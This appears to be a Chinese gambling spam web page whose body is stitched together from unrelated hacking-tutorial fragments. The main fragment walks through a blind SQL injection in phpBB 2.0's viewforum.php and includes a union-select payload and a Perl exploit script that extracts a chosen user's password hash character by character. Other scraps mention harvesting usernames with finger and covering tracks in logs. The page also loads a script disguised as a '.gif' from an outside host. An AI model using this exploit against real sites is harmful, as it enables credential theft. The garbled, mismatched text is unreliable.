<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>H-网络娱乐在线注册 - 网站</title>
<meta content="all" name="robots" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<link href="style.css" rel="stylesheet" type="text/css" />
</head>
<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
<div class="wrap">
   <div class="clear blank10"></div>
   <div class="navi">　您现在的位置 <a  href="http:///baiducom">首页</a> ><a  href="http:///baidu">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidugo">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
   <div class="clear blank10"></div>
   <div class="newsmain">
      <div id="side">
	      <div class="sideNav">
		     <h2>热门文章</h2>
		        <ul><li><a href="http://www.15bl.com/baiducom">鑫华城彩票怎么样</a></li>
</ul>
		   <div class="sidebottom"></div>
	       </div>
       </div>
       <div class="rightPar" id="about">
            <div class="aboutTitle">
                <h3><span>作者：admin </span> H-网络娱乐在线注册</h3>
            </div>
              <div id="MyContent">
					<div id="MyContent"><p>这五门核心考试包括四门操作系统考试和一门设计考试，这门设计考试你可以在四门备选考试中自由选择。
</p>
<p>在网上很难看到一篇完整的关于php注入的文章和利用代码,于是我自已把mysl和php硬啃了几个星期，下面说说我的休会吧,希在网上很难看到一篇完整的关于php注入的文章和利用代码,于是我自已把mysl和php硬啃了几个星期，下面说说我的休会吧,希望能抛砖引玉!相信大家对asp的注入已经是十分熟悉了,而对php的注入比asp要困难,因为php的magic_gpc选项确实让人头疼,在注入中不要出现引号,而php大多和mysl结合,而mysl的功能上的缺点,从另外一人角度看确在一定程度上防止了slnjection的攻击,我在这里就举一个实例吧,我以phpbb2.0为例:在viewforum.php中有一个变量没过滤:if(isset(HTTP_GET_VARSforum_id=(isset(HTTP_GET_VARS(HTTP_POST_VARSelseif(isset(HTTP_GET_VARS['forum']))forum_id=HTTP_GET_VARS['forum'];elseforum_id='';就是这个forum,而下面直接把它放进了查询中:if(!empty(forum_id))sl="SELECTFROM".FORUMS_TABLE."WHEREforum_id=forum_id";if(!(result=dbsl_uery(sl)))message_die(GENERAL_ERROR,'Couldnotobtainforumsinformation','',__LINE__,__FILE__,sl);elsemessage_die(GENERAL_MESSAGE,'Forum_not_exist');如果是asp的话，相信很多人都会注入了.如果这个forum_id指定的论坛不存在的话，就会使result为空，于是返回Couldnotobtainforumsinformation的信息,于是下面的代码就不能执行下去了Iftheuerydoesn'treturnanyrowsthisisn'tavalidforum.Informtheuser.if(!(forum_row=dbsl_fetchrow(result)))message_die(GENERAL_MESSAGE,'Forum_not_exist');Startsessionmanagementuserdata=session_pagestart(user_ip,forum_id)关键就是打星号的那一行了,这里是一个函数session_pagestart(user_ip,thispage_id),这是在session.php中定义的一个函数,由于代码太长，就不全贴出来了,有兴趣的可以自已看看，关键是这个函数还调用了session_begin(),函数调用如下session_begin(user_id,user_ip,thispage_id,TRUE))，同样是在这个文件中定义的,其中有如下代码sl="UPDATE".SESSIONS_TABLE."SETsession_user_id=user_id,session_start=current_time,session_time=current_time,session_page=page_id,session_logged_in=loginWHEREsession_id='".session_id."'ANDsession_ip='user_ip'";if(!(result=dbsl_uery(sl))││!dbsl_affectedrows())session_id=md5(uniid(user_ip));sl="INSERTINTO".SESSIONS_TABLE."(session_id,session_user_id,session_start,session_time,session_ip,session_page,session_logged_in)VALUES('session_id',user_id,current_time,current_time,'user_ip',page_id,login)";if(!(result=dbsl_uery(sl)))message_die(CRITICAL_ERROR,'Errorcreatingnewsession:session_begin','',__LINE__,__FILE__,sl);在这里有个session_page在mysl中定义的是个整形数,他的値page_id,也就是forum_id,如果插入的不是整形就会报错了,就会出现Errorcreatingnewsession:session_begin的提示,所以要指这forum_id的值很重要,所以我把它指定为:1%20union%20select%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20phpbb_users%20where%20user_id=2%20and%20ord(substring(user_password,1,1))=57,没有引号吧!虽然指定的是一个不存在的forum_id但他返回的查询结果可不一定是为空,这个就是猜user_id为2的用户的第一位密码的ascii码值是是否为57,如果是的话文章中第一段代码中的result可不为空了,于是就执行了ession_pagestart这个有问题的函数，插入的不是整数当然就要出错了，于是就显示Errorcreatingnewsession:session_begin,就表明你猜对了第一位了，其它位类似.如果没有这句出错信息的话我想即使注入成功也很难判断是否已经成功，看来出错信息也很有帮助啊.分析就到这里，下面附上一段测试代码，这段代码只要稍加修改就能适用于其它类似的猜md5密码的情况,这里我用的英文版的返回条件，中文和其它语言的只要改一下返回条件就行了.useHTTP::Reuest::Common;useHTTP::Response;useLWP::UserAgent;ua=newLWP::UserAgent;print"";print"phpbbviewforum.phpexp";print"codebypinkeyes";print"_blankwww.icehack";print"";print"pleaseentertheweakfile'surl:";print"e.g._blankhttp:192.168.1.4phpBB2viewforum.php";adr=;chomp(adr);print"pleaseentertheuser_idthatyouwanttocrack";u=;chomp(u);print"workstarting,pleasewait!";pink=(48..57);pink=(pink,97..102);for(j=1;j&lt;=32;j++)for(i=0;i&lt;pink;i++)url=adr."?forum=1%20union%20select%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20phpbb_users%20where%20user_id=u%20and%20ord(substring(user_password,j,1))=pink[i]";reuest=HTTP::Reuestnew('GET',"url");response=uareuest(reuest);if(responseis_success)if(responsecontent=Errorcreatingnewsession)pwd.=chr(pink[i]);print"pwd";if(pwdne"")print"successfully,Thepasswordispwd,goodluck";elseprint"badluck,workfailed!";至于最近的phpbb2.0.6的search.php的问题利用程序只要将上面代码稍加修改就行了。
</p>
<p>发现有三处，但这三处的程序大体上是一致的，我猜想是程序在运行过程中还要对检查title注册码正确与否，发现不对了立即中止运行。
</p>
<p>如果尝试使用runas从位置启动程序、MMC控制台或“控制面板项，可能会因为用来连接到共享资源的凭据与用来启动程序的凭据不同而失败。
</p>
<p>四、编写DllMain函数
</p>
<p>而DIR命令是DOS的内部命令，不需要执行任何外部的程序，因此对染毒软盘进行DIR操作不会感染病毒。
</p>
<p>表2遭入侵时，ACK包的计数情况
</p>
<p>好！我需要的Name出来了，赶快保存：bashfinger202.202.0.8homecrossbowname.lstbashmorehomecrossbowname.lst[202.202.0.8]Login
</p>
<p>答：Windows2000通过域来构建title客户机器模型，域中资源组织和集中管理都通过活动目录实现，即活动目录是管理域的工具，安装了活动目录就创建了域。
</p>
<p>12．3第三步我们将要创建著名的“HelloWorld程序。
</p>
<p>start指定要写入第一个扇区的十六进制数。
</p>
<p>如果攻击者完成攻击后就立刻离开系统而不做任何善后工作，title那么他的行踪将很快被系统管理员发现，因为所有的操作系统一般都提供日志记录功能，会把系统上发生的动作记录下来。
</p>
<p>一般在右边的是\ip找到的共享名。
</p>

					<br/>
					<p align=left >上一篇：<a href="83.html">世爵平台黑钱了
</a>|下一篇：<a href="85.html">世爵时时彩平台地址
</a></P>
					</div>
		  </div>
     </div>
  </div>
</div>
<div class="clear blank10"></div>
<div class="copyright"> <br>
 </div>
<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
</body>
</html>
